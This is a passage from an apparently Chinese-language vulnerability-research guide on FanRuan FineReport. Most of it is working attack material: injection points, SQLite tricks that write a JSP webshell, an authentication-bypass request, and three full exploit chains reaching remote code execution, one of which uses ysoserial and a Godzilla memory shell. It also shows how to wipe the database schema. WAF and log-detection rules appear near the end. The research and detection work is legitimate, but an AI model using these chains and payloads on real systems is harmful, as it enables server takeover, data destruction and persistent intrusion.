## 四、SQL注入漏洞挖掘

### 4.1 注入点识别

**URL参数注入**:
```
# 报表参数
/view/report?viewlet=xxx&parameter=${sql(...)}
/view/ReportServer?${sql(...)}

# 导出参数
/nx/report/v9/largedataset/export/excel?params=...
```

**POST参数注入**:
```
# XML参数 (Formula注入)
params=<R><Parameters><Parameter>
  <Attributes name="p1"></Attributes>
  <Object t="Formula">
    <Attributes>sql('FRDemo','...',1,1)</Attributes>
  </Object>
</Parameter></Parameters></R>

# JSON参数
__parameters__={"key": "${sql(...)}"}
functionParams={"p1": {"$p1": "value"}}
```

### 4.2 SQLite特有利用

**文件写入**:
```sql
-- 方式1: ATTACH DATABASE
ATTACH DATABASE '/webroot/shell.jsp' AS pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell VALUES ('<%@page import="java.util.*"%><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>');

-- 方式2: VACUUM INTO (更干净)
CREATE TABLE shell(code TEXT);
INSERT INTO shell VALUES ('<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>');
VACUUM INTO '/webroot/shell.jsp';
```

**清理数据库避免污染**:
```sql
-- 备份原数据库
VACUUM INTO './frdemo.db.bak';

-- 清空数据库结构
PRAGMA writable_schema=1;
DELETE FROM sqlite_schema;
PRAGMA writable_schema=0;

-- 写入shell
CREATE TABLE t(p text);
INSERT INTO t VALUES ('<%...%>');
VACUUM INTO '/webroot/shell.jsp';
```

**其他利用**:
```sql
-- 读取文件 (需要load_extension)
SELECT load_extension('path/to/extension');

-- 执行系统命令 (需要自定义函数)
-- SQLite本身不支持直接执行命令
```

### 4.3 其他数据库利用

**MySQL/Oracle/SQLServer**:
```
# 标准SQL注入技巧适用
# 关键是找到可用的数据库连接

1. 枚举数据库连接
SELECT * FROM fine_conf_entity WHERE key LIKE '%datasource%'

2. 利用连接执行查询
sql('target_connection', 'SELECT ...', 1, 1)

3. 常规SQL注入利用
- 读文件: LOAD_FILE()
- 写文件: INTO OUTFILE
- 执行命令: 需要特定条件
```

### 5.3 SessionId获取

**正常流程**:
```
1. 访问需要sessionId的接口
2. 系统检查sessionId有效性
3. 无效则重定向到登录页
```

**绕过流程**:
```
1. 构造特殊请求绕过鉴权
2. 触发sessionId生成逻辑
3. 获取有效的sessionId
4. 用于后续请求
```

**Payload**:
```
GET /webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]
```

## 六、漏洞组合利用

### 6.1 攻击链一：鉴权绕过→RCE

```
Step 1: 获取sessionId
GET /webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]
→ 返回: {"sessionID": "xxx-xxx-xxx"}

Step 2: 构造恶意XML
<?xml version="1.0"?>
<R>
  <Parameters>
    <Parameter>
      <Attributes name="p1"></Attributes>
      <Object t="Formula">
        <Attributes>sql('FRDemo','CREATE TABLE ...',1,1)</Attributes>
      </Object>
    </Parameter>
  </Parameters>
  <LargeDatasetExcelExportJS exportFileName="test" dsName="ds1" colNames="{}"/>
</R>

Step 3: 发送payload
POST /webroot/decision/nx/report/v9/largedataset/export/excel
Headers:
  sessionID: xxx-xxx-xxx
  Content-Type: application/x-www-form-urlencoded
Body:
  params=[XML]
  __parameters__={}
  functionParams={}

Step 4: 访问Webshell
GET /webroot/shell.jsp?cmd=whoami
```

### 6.2 攻击链二：反序列化→内存马

```
Step 1: 生成内存马字节码
java -jar java-memshell-generator.jar \
  --type TomcatFilter \
  --shellType godzilla \
  --password pass

Step 2: 构造hibernate链
// 使用ysoserial或自定义代码
java -jar ysoserial.jar hibernate1 payload.class > payload.ser

Step 3: 发送payload
POST /webroot/decision/remote/design/channel
Content-Type: application/x-www-form-urlencoded

[binary payload]

Step 4: 连接内存马
# 哥斯拉连接
URL: http://target/webroot/decision/shell
Password: pass
Type: Java
```

### 6.3 攻击链三：模板注入→RCE

```
Step 1: 测试表达式解析
GET /webroot/decision/view/ReportServer?${1+1}
→ 响应包含 "2" 则存在漏洞

Step 2: 测试SQL函数
GET /webroot/decision/view/ReportServer?${sql('FRDemo','SELECT 1',1,1)}

Step 3: 构造RCE payload
GET /webroot/decision/view/ReportServer?${sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20...'),1,1)}

Step 4: 分步写入shell
# 多次请求分别执行:
1. ATTACH DATABASE
2. CREATE TABLE
3. INSERT shellcode
4. DETACH DATABASE
```

## 七、防护与检测

### 7.1 WAF规则建议

```yaml
# 反序列化检测
- rule: java_deserialization
  pattern: "\\xac\\xed\\x00\\x05"
  action: block

# 表达式注入检测
- rule: expression_injection
  pattern: "\\$\\{.*?\\}|#\\{.*?\\}"
  action: block

# SQL关键词检测
- rule: sql_keywords
  pattern: "(?i)(attach|vacuum|pragma|replace)\\s+(database|into)"
  action: block

# Formula注入检测
- rule: formula_injection
  pattern: "<Object\\s+t\\s*=\\s*[\"']Formula[\"']>"
  action: block
```

### 7.2 日志检测规则

```
# 检测可疑请求
- 请求路径包含: channel, ReportServer, largeds
- 请求参数包含: ${, #{, sql(, DECODE(
- 请求体包含: <Object t="Formula">
- 响应包含: java.io.Serializable, ClassNotFoundException
```

## 十、总结

帆软报表作为企业级报表工具，其历史漏洞主要集中在以下几个方向：

1. **反序列化**: 通过channel接口或HSQL触发
2. **表达式注入**: 通过Calculator解析用户输入
3. **SQL注入**: 通过SQL函数或参数注入
4. **鉴权绕过**: 通过边界条件绕过权限检查

漏洞挖掘的关键在于：
- 理解框架的设计理念和代码风格
- 分析输入验证和数据流转
- 寻找安全检查的盲点
- 组合多个小漏洞形成攻击链

建议在进行安全测试时，结合静态代码审计和动态测试，深入分析业务逻辑，才能发现更多高危漏洞。
